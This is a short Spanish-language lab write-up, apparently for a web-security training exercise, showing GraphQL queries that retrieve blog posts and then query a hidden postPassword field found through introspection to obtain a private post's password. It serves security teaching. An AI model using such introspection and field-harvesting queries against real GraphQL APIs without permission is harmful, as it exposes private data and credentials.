---
title: "1 - Accessing private GraphQL posts"
---

# 1 - Accessing private GraphQL posts

**Consulta usando variables para obtener información de un post**
``` graphql
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
        }
    }
    
    {"id":4}
```

**Consulta para obtener todos los post** ()
```graphql
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```

Si ejecutamos una Instrospection query podemos observar como postPassword es uno de los atributos del objeto blogPost.

Ejecutando:

``` graphql
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            postPassword
        }
    }
    
    {"id":3}
```

Obtenemos la contraseña
